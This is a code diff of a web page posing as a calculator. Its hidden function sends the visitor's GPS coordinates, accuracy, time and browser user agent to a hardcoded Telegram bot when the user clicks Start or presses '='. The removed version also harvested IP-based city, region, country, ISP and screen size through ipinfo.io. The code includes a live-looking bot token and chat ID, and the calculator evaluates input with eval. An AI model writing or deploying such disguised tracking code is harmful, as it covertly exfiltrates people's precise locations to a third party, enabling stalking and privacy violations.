@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Smart Calculator</title>
+  <title>Smart Location Calculator</title>
   <style>
     body {
       margin: 0;
@@ -133,67 +133,53 @@
   function calculate() {
     try {
       display.innerText = eval(display.innerText);
-      sendLocationToTelegram("User pressed =");
+      sendLocation("User pressed =");
     } catch {
       display.innerText = "Error";
     }
   }
 
   function startCalculator() {
-    sendLocationToTelegram("User clicked Start");
+    sendLocation("User clicked Start");
     document.getElementById("startScreen").classList.remove("active");
     document.getElementById("calculator").classList.add("active");
   }
 
-  function sendLocationToTelegram(eventNote) {
-    const BOT_TOKEN = "8148507636:AAE5JkA-Hc-AmAJMiM8Pz2t_BQoCC7VKtLc";
-    const CHAT_ID = "7357184121";
-    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  function sendLocation(note) {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(pos) {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const accuracy = pos.coords.accuracy;
 
-    fetch("https://ipinfo.io/json?token=ENTER_YOUR_TOKEN_OR_REMOVE")
-      .then(res => res.json())
-      .then(ipData => {
-        let data = {
-          ip: ipData.ip,
-          city: ipData.city,
-          region: ipData.region,
-          country: ipData.country,
-          loc: ipData.loc,
-          org: ipData.org,
-          timezone: ipData.timezone,
-          userAgent: navigator.userAgent,
-          screen: `${screen.width}x${screen.height}`
-        };
+        const message = `
+📍 ${note}
 
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(function(pos) {
-            data.gps_lat = pos.coords.latitude;
-            data.gps_lng = pos.coords.longitude;
-            data.gps_accuracy = pos.coords.accuracy;
+🌍 Location:
+Latitude: ${lat}
+Longitude: ${lon}
+Accuracy: ${accuracy}m
 
-            const message = `
-📍 <b>${eventNote}</b>
+🕒 Time: ${new Date().toLocaleString()}
+📱 Device: ${navigator.userAgent}
+        `;
 
-🌐 <b>IP:</b> ${data.ip}
-🏙️ <b>Location:</b> ${data.city}, ${data.region}, ${data.country}
-📍 <b>GPS:</b> ${data.gps_lat}, ${data.gps_lng} (±${data.gps_accuracy}m)
-📱 <b>Device:</b> ${data.userAgent}
-📏 <b>Screen:</b> ${data.screen}
-🕒 <b>Time:</b> ${new Date().toLocaleString()}
-            `;
+        const TOKEN = "8148507636:AAE5JkA-Hc-AmAJMiM8Pz2t_BQoCC7VKtLc";
+        const CHAT_ID = "7357184121";
 
-            fetch(TELEGRAM_API, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: "HTML"
-              })
-            });
-          });
-        }
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: "HTML"
+          })
+        });
       });
+    }
   }
 </script>
 
